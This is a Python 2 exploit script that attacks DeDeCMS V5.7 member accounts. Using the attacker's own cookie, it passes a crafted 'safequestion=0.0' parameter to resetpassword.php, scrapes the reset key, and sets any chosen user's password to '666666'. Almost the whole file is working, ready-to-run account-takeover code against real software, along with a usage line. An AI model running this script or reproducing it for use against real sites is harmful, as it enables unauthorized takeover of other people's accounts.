#!/usr/bin/env python
# encoding: utf-8

"""
@author: xl7dev
@contact: root@safebuff.com
@time: 2018/1/11 下午4:14
"""

import re
import sys
import requests
from bs4 import BeautifulSoup

"""
影响产品:
	DeDecms(织梦CMS) V5.7.72 正式版20180109 (最新版)
From:
	https://xianzhi.aliyun.com/forum/topic/1926
"""


def attack(url, target_id, cookies):
	headers = {'Cookie': cookies}
	rs = requests.get(url + '/member/index.php', headers=headers)
	if rs.status_code == 200:
		if '/member/myfriend.php' in rs.text and '/member/pm.php' in rs.text:
			print '账号登陆成功'
		else:
			exit('账号登陆失败！')

		payload_url1 = "{url}/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id={id}".format(
			url=url,
			id=target_id)
		rs = requests.get(payload_url1, headers=headers)
		if '对不起，请10分钟后再重新申请'.decode('utf-8') in rs.text:
			exit('对不起，请10分钟后再重新申请').decode('utf-8')

		searchObj = re.search(r'<a href=\'(.*?)\'>', rs.text, re.M | re.I)
		payload_url2 = searchObj.group(1)
		payload_url2 = payload_url2.replace('amp;', '')
		print 'Payload : ' + payload_url2
		rs = requests.get(payload_url2, headers=headers)
		soup = BeautifulSoup(rs.text, "html.parser")
		userid = soup.find_all(attrs={"name": "userid"})[0]['value']
		key = soup.find_all(attrs={"name": "key"})[0]['value']
		data = {'dopost': 'getpasswd', 'setp': 2, 'id': target_id, 'userid': userid, 'key': key, 'pwd': 666666,
				'pwdok': 666666}
		rs = requests.post(url + "/member/resetpassword.php", data=data, headers=headers)
		if '更改密码成功，请牢记新密码'.decode('utf-8') in rs.text:
			print '更改密码成功'.decode('utf-8')
			print '账号：'.decode('utf-8') + userid
			print '密码：'.decode('utf-8') + '666666'
		else:
			print '更改密码失败'.decode('utf-8')


if __name__ == "__main__":
	if len(sys.argv) < 2:
		print "Using: python dedecms_update_member_password.py http://www.dedecms.com target_user_id mycookies"
		exit()
	url = sys.argv[1]
	target_id = sys.argv[2]
	cookies = sys.argv[3]
	attack(url, target_id, cookies)
